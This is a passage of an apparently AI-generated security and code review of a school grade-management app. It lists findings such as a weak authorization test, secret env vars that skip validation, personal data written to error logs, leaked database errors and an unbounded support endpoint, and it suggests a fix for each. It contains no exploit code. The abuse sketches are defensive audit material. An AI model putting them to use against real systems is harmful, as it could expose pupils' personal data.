**Suggested fix.** Before quoting, if a value starts with one of = + - @ \t \r, prefix it with a single apostrophe (and still CSV-quote it). Apply the same guard to the xlsx exports for any user-supplied text cells.


### S4 — Minor issues & hardening

#### 37. route-guards test cannot detect a write handler guarded weaker than policy when the same file also exports a lower-tier GET

- **Area:** Authorization / Access · **Severity:** S4 _(verifier adjusted severity from S3)_ · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/app/api/__tests__/route-guards.test.ts:92`

**What & why.** The 'does not leave any handler on a weaker tier' assertion compares each declared guard tier against `Math.min(...required.map(...))` — the MINIMUM required tier across all methods the file exports (lines 92-100), not the tier of the specific method the guard protects. In a file that exports both a low-tier read and a higher-tier write (the schedules/assignments, schedules/times, schedules/teacher-assignments, schedules/data pattern where GET=session but writes fall to the default staff), a mutating handler mistakenly guarded at `session` would still pass, because the GET's `session` is the minimum. The first test (`guards every exported handler`) is also file-level: it only checks that SOME guard pattern appears anywhere in the file, not that each handler is guarded. Today no file actually exploits this (verified: every mixed-tier file guards GET at session and the write at staff), so this is latent, but it is a hole in the very defence the codebase leans on to keep new routes safe.

**Failure scenario.** A future edit adds `export async function DELETE(...)` to src/app/api/schedules/data/route.ts (policy: default staff) but copy-pastes the existing `requireAccess('session')` guard. Both route-guards tests pass — the file already has a guard, and `session` is not below the min required tier (session, from GET) — so a student-tier caller can invoke a staff-only mutation with no test catching the downgrade.

**Suggested fix.** Associate each guard call with the specific handler it protects (parse per-handler bodies) and assert that handler's declared tier is >= resolveAccessTier(route, thatMethod), instead of comparing against the file-wide minimum. Also assert the count of guard calls equals the count of exported handlers for non-exempt routes.


#### 38. Drift-summary email is sent to a deactivated class lead because the classLead is read through a nested include that bypasses the isActive filter

- **Area:** Notifications · **Severity:** S4 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/lib/sokrates-lock.ts:417`

**What & why.** recordSokratesChanges resolves the class lead via `prisma.class.findUnique({ include: { classLead: {...} } })` (lines 333-334). Per src/lib/prisma.ts, the active-by-default extension only intercepts top-level operations — a nested relation read through `include` is NOT filtered — so classRecord.classLead can be a directory-deactivated teacher. The in-app bell path correctly drops them (notify -> resolveRecipients uses a top-level teacher.findMany that DOES inject isActive:true), but the email path at line 417 sends the grade-drift summary straight to `classRecord.classLead?.email` without any isActive check. The digest deliberately guards this (`if (!bucket.isActive) continue`), so the direct email here is the one inconsistent channel.

**Failure scenario.** A teacher who is still recorded as classLeadId of class 5A is deactivated by Entra sync (left the school) but not unset as class lead. A subject teacher changes a grade after the Sokrates mark. No bell entry is created for the departed lead (correctly filtered), but a 'Notenänderung nach Sokrates-Übertragung' email containing student names, teacher names and grade values is delivered to the departed teacher's mailbox.

**Suggested fix.** Only email the class lead when active, e.g. include `isActive` in the classLead select and gate the send on `classRecord.classLead?.isActive`, or resolve the lead through a top-level teacher.findUnique/findFirst that honours the default filter.


#### 39. Security-critical env vars (NEXTAUTH_SECRET, GRAPH_* mail secrets, photo-source vars) are read via process.env but never declared in env.js/runtimeEnv, bypassing the boot-time validation contract

- **Area:** Crypto / secrets / env · **Severity:** S4 _(verifier adjusted severity from S3)_ · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/env.js:9`

**What & why.** env.js is documented as the single boot-time validator whose whole point is 'failing at boot beats failing at the login page'. But several vars the app depends on are read directly with process.env and are absent from both the zod `server` schema and `runtimeEnv`, so createEnv never validates them: NEXTAUTH_SECRET (crypto.ts:26 — the scrypt KDF root for at-rest secret encryption AND the NextAuth JWT signing secret), and GRAPH_TENANT_ID / GRAPH_CLIENT_ID / GRAPH_CLIENT_SECRET / GRAPH_MAIL_FROM / GRAPH_MAIL_TO (send-support-email-graph.ts:4-8, read with a non-null `!` assertion). Also undeclared: ENTRA_STUDENT_PHOTO_CACHE_TTL_HOURS / ENTRA_TEACHER_PHOTO_CACHE_TTL_HOURS, ENTRA_STUDENT_PHOTO_SOURCE_PRIORITY / ENTRA_TEACHER_PHOTO_SOURCE_PRIORITY, and the client var NEXT_PUBLIC_ENTRA_TEACHER_GROUP_ID (entra-sync/page.tsx:152). Because these bypass env.js, a deployment that omits them passes validation and boots clean, then fails opaquely at first use.

**Failure scenario.** Operator deploys production without SKIP_ENV_VALIDATION and forgets GRAPH_CLIENT_SECRET (and/or NEXTAUTH_SECRET). env.js validation passes (these keys aren't in its schema), so the app boots green. Later: (a) `process.env.GRAPH_CLIENT_SECRET!` is undefined -> the token POST sends `client_secret: 'undefined'` -> Graph returns 401 -> every support email silently fails, surfacing only as buried error-log rows; (b) if NEXTAUTH_SECRET is missing, encryptSecret throws only when an admin first saves the Notenmanagement service password, yielding a runtime 500 instead of the intended boot-time failure. The validation contract the codebase relies on is defeated.

**Suggested fix.** Declare NEXTAUTH_SECRET (required) and the GRAPH_* mail secrets (required if support email is enabled, else optional) in env.js `server` and mirror them in `runtimeEnv`; add the photo TTL/priority vars and NEXT_PUBLIC_ENTRA_TEACHER_GROUP_ID (client). Then read them through `env` instead of raw process.env with `!`, so a missing secret fails at boot as intended.


#### 40. Support route writes user-submitted name/message into the ErrorLog context when the notification email fails to send

- **Area:** Crypto / secrets / env · **Severity:** S4 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/support/route.ts:50`

**What & why.** On email-send failure the handler calls captureError with extra: { name, message, currentUri }. redactContext (error-log.ts:66) only redacts keys whose lowercased name is in REDACT_KEYS; 'name', 'message' and 'currenturi' are not in that set, so the raw user-submitted support text and submitter name are stored verbatim (up to 500 chars each) in the ErrorLog.context column, readable by every admin in the Fehlerprotokoll. This is user free-text that may contain personal details, and it is persisted purely as a side effect of an email failure the user never sees.

**Failure scenario.** Microsoft Graph mail is misconfigured (see the undeclared GRAPH_* finding). A user submits a support message containing personal information ('my student ID 12345, I can''t see my grades, contact me at ...'). sendSupportEmail throws; the catch at line 50 persists { name:'<real name>', message:'<the PII text>', currentUri } into ErrorLog.context unredacted, contradicting error-log.ts's own contract that context must be 'already redacted — never raw request bodies, grades, or other PII'.

**Suggested fix.** Do not pass the support body into the error log; log only non-PII metadata (e.g. the message length and whether currentUri was present), or add these keys to REDACT_KEYS. The full support content is already persisted in SupportMessage, so it need not be duplicated into the shared error log.


#### 41. ScheduleTurnusPDF loses its column headers on page 2 when the week table overflows

- **Area:** PDF generation · **Severity:** S4 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/components/ScheduleTurnusPDF.tsx:159`

**What & why.** The turnus/weeks table header row (`<View style={styles.headRow}>`, lines 159-168) carries the TURNUS name and week count for each column but is NOT marked `fixed`. Each data row is wrap={false}, and the table itself wraps between rows, so when the row count exceeds the page the table spills to a second page. Because the header is not fixed, page 2+ shows unlabeled columns — the reader can no longer tell which column is which turnus. (The document's own page footer IS fixed, so the mechanism is available.)

**Failure scenario.** A turnus with a long teaching-week list (maxRows large; reproduced 2 pages at 25 weeks/turnus with 3 turnusse) renders page 1 with headers and page 2 with bare date/week cells and no TURNUS column headings — the second page's grid is ambiguous. Low frequency (a single turnus rarely exceeds ~20 weeks), but the output is degraded whenever it does.

**Suggested fix.** Add `fixed` to the headRow View (as the main NotensammlerDocument does with its wrapped header) so column headers repeat on every page the table spans.


#### 42. Internal error messages (Prisma details) returned to the client in grade/import 500s

- **Area:** Input validation & imports · **Severity:** S4 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/notensammler/grades/route.ts:417`

**What & why.** Several handlers return the raw error.message to the client in their 500 response body, inconsistent with the rest of the API which returns a generic error. Same pattern in notensammler/grades/batch/route.ts:280 (details), admin/grades/import/route.ts:250 (message), and admin/settings/import/route.ts:154 (message).

**Failure scenario.** A request that trips a Prisma error (e.g. a foreign-key violation from an unknown studentId/teacherId in a grade upsert, or a unique-constraint failure) returns the raw Prisma message to the caller, disclosing internal table/column/constraint names and connection detail. It gives an authenticated user a schema-enumeration oracle and diverges from the codebase's own 'generic error to client, detail to Sentry' convention.

**Suggested fix.** Return only a stable generic message to the client; keep error.message/stack in captureError (Sentry) as these routes already do.


#### 43. Support endpoint stores and e-mails an unbounded message body (session-tier abuse)

- **Area:** Input validation & imports · **Severity:** S4 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/support/route.ts:35`

**What & why.** The POST handler validates only that name and message are truthy, then persists them to SupportMessage (whose message column is Prisma String -> unbounded Postgres TEXT, schema.prisma:385) and forwards the full text in an admin e-mail. There is no length cap and no rate limiting, and the route is 'session' tier so any student can call it.

**Failure scenario.** A signed-in student scripts repeated POSTs with a 20 MB message field. Each request writes an unbounded row to Postgres (storage-exhaustion / DB bloat) and triggers a 20 MB outbound admin e-mail via Graph (send amplification, and likely provider rejection/queue backup). Nothing bounds size or frequency.

**Suggested fix.** Cap name and message length (e.g. 200 / 5000 chars) and reject oversized bodies before persisting/e-mailing; add basic per-user rate limiting.

## 4. Findings dismissed on verification (for transparency)

The adversarial pass refuted these four candidate findings — they are listed so the same false leads aren't
chased again.

### ~~Transfer preview/transfer routes never verify the session teacher is assigned to the class — any staff user reads or transfers grades + Matrikelnummer for classes they don't teach~~ — REFUTED
- **Was claimed at:** `src/app/api/notensammler/transfer/preview/route.ts:80` (notenmanagement, claimed S3)
- **Why dismissed:** The finding's code observations are literally accurate: neither src/app/api/notensammler/transfer/preview/route.ts nor .../transfer/route.ts verifies the session teacher is assigned to the class. Both only requireAccess('staff'); the teacherAssignment.findMany({where:{classId}}) queries (preview L80, transfer L150) exist solely to derive the subject, and the response includes matrikelnummer, endnote, names. A staff caller can POST an arbitrary classId and get data back. That part is real and reachable.

  But the finding is built on a false premise — that per-teacher class-ownership is "the intended contract" that these two routes uniquely violate. It is not. The intended contract for the entire /api/notensammler surface is documented explicitly in docs/API/notensammler/README.md: "All routes require the staff access tier; the Sokrates mutating routes additionally require the caller to be the class's classLead or an admin." There is no per-teacher class-ownership requirement — the notensammler is a collaborative grade-collection tool, and the class-lead/Sokrates-lock machinery exists precisely because any staff member can view and edit any class's grades.

  This is confirmed by the consistent pattern across the whole surface, not just the two flagged routes:
   - notensammler/class/[id]/route.ts (GET): returns any class's students + teachers + transfer status to any staff, no isAssignedToClass check.
   - notensammler/grades/route.ts (GET/POST/DELETE): reads ALL teachers' grades for any class, and writes/deletes them, gated only by the Sokrates lock (not class ownership).
   - notensammler/final-grades/route.ts (POST): writes the Endnote for any class, gated only by the Sokrates lock.
   - notensammler/transfer/view/route.ts (POST): reads back NM Noten (incl. Matrikelnummer) for any LF, staff-only.
  So the endnote + names the failure scenario dramatizes are ALREADY fully readable and writable by any staff member by documented design; preview/transfer are not anomalous.

  The finding's supporting comparison — noten/final-grades/route.ts:82-87 enforcing isAssignedToClass — is a DIFFERENT feature domain (/api/noten/, the class-lead Endnote page), which has a stricter, deliberately class-scoped contract. A stricter rule in the noten domain does not establish an intended contract for the notensammler domain; the reviewer generalized across domains. The write path, moreover, authenticates against the external Notenmanagement system with the individual teacher's OWN credentials (LFs attributed to them), which is the documented backstop by design, not an oversight.

  The only element not already exposed by the rest of the staff-tier notensammler surface is the Matrikelnummer/nmKlasse — a low-sensitivity, school-internal student identifier surfaced because the transfer flow needs it to build the NM payload. That is consistent with the feature's documented staff-tier access model, not a departure from it. Behaviour is intended and documented; the premise that scoping is the contract is refuted.

### ~~NotensammlerAllClassesDocument ClassCard is wrap=false and cannot paginate one class — a large class is silently clipped (missing students)~~ — REFUTED
- **Was claimed at:** `src/components/pdf/NotensammlerAllClassesDocument.tsx:160` (pdf, claimed S3)
- **Why dismissed:** The mechanism is real: src/components/pdf/NotensammlerAllClassesDocument.tsx line 160 wraps each class in a single `<View style={styles.card} wrap={false}>` and pagination (chunk(data.classes, CLASSES_PER_PAGE=4), lines 148-152/236) is by class count only, with no height-based split and no `fixed` header fallback. So react-pdf will clip a card taller than one page, as the reviewer reproduced. However, the failure is not reachable with realistic data for this deployment. (1) The component's own doc comment (lines 29-33) documents the envelope: '~36 students each, which is the tallest class this school runs.' (2) The reviewer's own reproduction shows clipping starts only at n=44+; n≤36 fits one page and n=38-42 merely relocates the intact card to page 2 — an 8-student margin above the documented max. (3) The data path (route.ts lines 59-72) derives rows from classMembership scoped to one schoolYearId, deduplicated by student id via findMany({where:{id:{in:studentIds}}}), and the component further filters to groupId != null (line 156), so rendered rows can only be fewer than actual class enrollment. (4) Austrian HTL class sizes are regulatorily capped well below 44 (standard ~30; this school's stated tallest 36). Reaching 44+ grouped students in one class is ~22% above the school's own maximum and outside the system's operating envelope, so the ~44 clip threshold is never hit in practice. This is a genuine latent robustness gap but the described silent-clipping failure does not occur on realistic input.

### ~~Turnus column prints holiday weeks as teaching weeks ("N UW")~~ — REFUTED
- **Was claimed at:** `src/components/pdf/WechselplanDocument.tsx:310` (pdf, claimed S4)
- **Why dismissed:** The finding's core premise — that ScheduleWeek rows flagged isHoliday=true are present in the weeks array and inflate `${info.days} UW` — is false for all real data. getTurnusInfo (pdf-helpers.ts:202) does compute days=weeks.length with no isHoliday filter, but that only matters if holiday weeks actually occupy week rows, and they never do.

  Creation path (schedule-cadence.ts:126-172, computePeriodTurns): teachingDates filters out holidays via `!isHolidayDate(date, holidays)`, and each persisted week is built with isHoliday:false; holidays are stored separately in term.holidays (→ ScheduleTurnHoliday, not ScheduleWeek). The client wizard (turnus-editor.tsx) uses computePeriodTurns and serializes those exact terms; POST /api/schedules → parseJsonToNormalized → createScheduleTurnData persists them verbatim (all isHoliday:false).

  Legacy path (rotation-schedule-editor.tsx at dd3c463^) did the same: getAllRotationDates already excluded holidays (line 472 `if (!isHoliday(date))`), and the save mapping explicitly did `weeks.filter(w => !w.isHoliday).map(... isHoliday:false)`, keeping holidays only in a separate `holidays` field. So even migrated legacy data has no isHoliday=true week rows. seed-local-fixtures.ts also seeds weeks without isHoliday (defaults false).

  The ONLY source of a week with isHoliday=true anywhere in the repo is the hand-authored dev fixture scripts/preview-pdfs.ts:185 (`isHoliday: t % 4 === 3 && w === 3`), used exclusively by `npm run pdf:preview` to exercise the red holiday styling — not a real or seeded export path. The reviewer took that fixture as evidence that holiday weeks exist in real data; they do not.

  Consequently, for a turnus spanning 5 calendar weeks where one is a holiday, computePeriodTurns stores only the 4 teaching-week rows, so weeks.length=4 and the label correctly prints '4 UW'. 'UW' (Unterrichtswochen) is accurate, not overstated. Both PDFs share the same normalizeToJsonFormat weeks array; because real ScheduleWeek rows are always isHoliday=false, ScheduleTurnusPDF's holidayCount is always 0, its 'kein Unterricht (N Wochen)' footnote never renders, and 'N UW' equals 'N Wochen' — there is no user-visible discrepancy or inflation. The claimed failure is unreachable on current (and legacy) data.

### ~~ScheduleTimesSelector never clears the selected times when switching class, so a stale selection can be saved to the wrong class~~ — REFUTED
- **Was claimed at:** `src/components/schedule/schedule-times-selector.tsx:163` (frontend, claimed S3)
- **Why dismissed:** The finding's failure requires that switching from class A to class B on the times step keeps the same ScheduleTimesSelector instance mounted (a search-param-only navigation on /schedule/create/times), so the never-reset selection state survives. That premise does not hold in this app. ScheduleTimesSelector is used only by src/app/schedule/create/times/page.tsx, and the creation wizard is strictly single-class: the ?class= param is chosen once at /schedule/create and carried forward unchanged. CreationProgress.hrefFor only preserves the current class and only exposes completed/current steps of the SAME class flow; there is no class switcher, dropdown, or any control on the times page or its layout (src/app/schedule/create/layout.tsx) that rewrites ?class= in place. Consequently there is no navigation path that goes times?class=A -> times?class=B on the same pathname. Reaching class B's times always requires passing back through /schedule/create (class picker) and the intermediate steps — all different pathnames — so the layout's {children} slot renders a different page component and React unmounts/remounts the times page. Every documented entry into the route is a pathname change (turnus-editor.tsx:219, use-schedule-creation.ts:50, CreationProgress links). A fresh mount re-initializes useState, so selectedAMScheduleTime/PM/breaks start at null before fetchData loads the new class. Manual URL-bar edits are hard navigations (full remount), and browser back/forward never places two times?class=X URLs adjacent in history. The race variant (slow A-load overwriting B) likewise needs className to change while mounted, which never occurs; within a single mount className is fixed and both fetchData firings target the same class. The missing reset-to-null (lines 163-180) and missing abort token (effect lines 104-109) are minor defensive-coding gaps, but the claimed save-to-wrong-class corruption is not reachable on the current code.

## 5. Suggested order of work

Correctness and security first; the weekday-scoping cluster next because it silently corrupts what teachers
see; then retry-safety, then the rest.

| # | Item | Findings | Effort |
|---|------|----------|--------|
| 1 | **`/api/schedules/data`: raise to `staff`, verify caller owns the teacher, add an explicit `Student` `select`.** Highest priority — leaks minors' national IDs to any student. | 1 | S |
| 2 | Close the other `session`-tier over-exposures: scope `/api/students/photo`, `/api/students/class` to ownership/staff; bound `ids` in `/api/students/photo/check`. | 2, 13, 16 | S |
| 3 | Log secrets nowhere: strip `password`/`token` from `requestData` before `captureError` (and audit other `extra:` payloads). | 11 | XS |
| 4 | Scope every rotation/schedule read by `selectedWeekday` **and** `schoolYearId`; stop relying on `orderBy createdAt desc` "latest wins". | 6, 7, 8, 22 | M |
| 5 | Make Notenmanagement transfer retry-safe: a DB-level idempotency key that survives NULL `groupId`, and only treat a real 404 as "LF deleted". | 4, 12, 27 | M |
| 6 | Sync safety: apply the deactivation-threshold guard **per group**, skip (don't deactivate) a group whose Graph fetch failed, and align teacher-sync on transitive membership. | 9, 10, 35 | M |
| 7 | Sokrates lock gaps: guard `PATCH /api/noten/final-grades` with `withSokratesLock`; read grades *inside* the lock in `grades/batch`; wrap `recordSokratesChanges` so it can't 500 a committed write. | 5, 20, 26 | M |
| 8 | Grade edge cases: deterministic NB-vs-GS priority, per-field weight bounds, one shared per-semester average, and stop "Alle speichern" writing the Endnote into a teacher column. | 3, 17, 18, 19 | M |
| 9 | Resource limits: rate-limit / cap `client-errors`, `support`, and the photo upload; stop returning Prisma error text to clients; neutralise CSV formula injection on export. | 28, 30, 36, 42, 43 | S–M |
| 10 | Close the test gaps that let the above rot: per-*handler* guard enumeration, a `/api/sync/run` secret test, and coverage for `teacher-sync.ts`. | 15, 33, 34, 37 | S |
| 11 | Frontend correctness: cancel/guard stale schedule fetches, invalidate the destination roster on transfer, share a debounce key for same-row autosaves. | 14, 31, 32 | S |
| 12 | Notifications & PDF polish: don't collapse fresh events onto digested rows, drop deactivated leads from drift mail, restore PDF page-2 headers, reconcile PDF rotation with the saved plan. | 25, 29, 38, 41 | S–M |

---

_Review performed with a 12-dimension multi-agent sweep and per-finding adversarial verification; 59 agents,
0 errors. Findings are advisory — confirm each against current `main` before implementing, since this branch
may drift._

_Generated by [Claude Code](https://claude.ai/code)_
